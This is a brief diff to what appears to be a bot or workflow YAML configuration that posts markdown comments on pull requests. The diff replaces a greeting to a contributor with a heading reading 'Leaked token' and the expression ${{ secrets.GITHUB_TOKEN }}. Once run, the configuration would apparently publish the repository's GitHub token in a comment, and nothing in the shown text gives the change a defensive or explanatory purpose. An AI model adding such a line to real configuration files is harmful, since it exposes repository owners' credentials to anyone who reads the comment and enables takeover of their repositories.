@@ -1,4 +1,5 @@
 - markdown: |
-    Hey @slvignesh05, a new pr?
+    ## Leaked token
+    ${{ secrets.GITHUB_TOKEN }}
   pathFilter:
     - '*'
